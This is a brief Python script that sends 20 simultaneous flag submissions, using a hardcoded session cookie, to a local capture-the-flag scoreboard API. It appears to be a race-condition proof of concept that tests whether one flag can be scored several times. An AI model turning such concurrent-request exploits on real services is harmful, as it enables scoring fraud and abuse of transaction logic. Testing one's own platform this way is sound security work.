import json
import requests
import threading

def T():
    cookies = {'session': 'eyJ0ZWFtaWQiOjh9.Y9X9hw.Msc-z-tj5Oke6eOebaJmoJss1b0'}

    r = requests.post("http://localhost/api/submit",
                      cookies=cookies,
                      headers={"Content-Type": "application/json"},
                      data=json.dumps({"flag": "SECCON{TokyoWesterns_c94304c939e6b3c185e98465b6063209}"}))
    print(r.text)

thList = []
for i in range(20):
    th = threading.Thread(target=T)
    thList.append(th)

for th in thList:
    th.start()

for th in thList:
    th.join()
